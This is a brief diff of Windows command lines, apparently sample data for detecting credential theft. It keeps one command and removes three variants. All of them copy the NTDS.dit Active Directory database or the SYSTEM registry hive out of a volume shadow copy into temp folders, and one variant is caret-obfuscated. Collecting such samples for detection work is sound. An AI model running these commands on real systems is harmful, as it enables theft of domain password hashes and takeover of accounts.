@@ -1,4 +1,1 @@
 "cmd.exe" /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
-cmd.exe /c "c^opy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive"
-cmd.exe /c "type \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM > C:\temp\system.hive"
-powershell.exe -Command "Copy-Item -Path '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM' -Destination 'C:\temp\system.hive'"
